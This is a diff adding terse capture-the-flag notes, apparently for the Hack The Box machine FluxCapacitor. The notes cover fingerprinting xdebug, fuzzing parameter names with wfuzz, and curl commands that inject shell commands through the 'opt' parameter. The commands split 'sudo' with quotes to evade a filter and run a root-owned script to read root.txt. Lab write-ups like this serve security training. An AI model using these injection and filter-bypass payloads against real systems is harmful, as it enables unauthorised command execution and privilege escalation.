@@ -1,0 +1,11 @@
+nothing was ovious so on dong curl -I  it showed xdebug 2.5.5
+
+now we did a ==wfuzz== to find which papameter give /etc/passwd
+
+`wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "User-Agent: nothingtoseehere" --hh=19 "http://fluxcapacitor.htb/sync?FUZZ=test"`
+
+on gobuster we found it had some ==protection== for lfi
+
+`curl "10.10.10.69/sync?opt=' su''do -l'"`
+
+`curl "10.10.10.69/sync?opt=' su''do /home/themiddle/.monit cmd $(echo cat /root/root.txt | base64)'"`
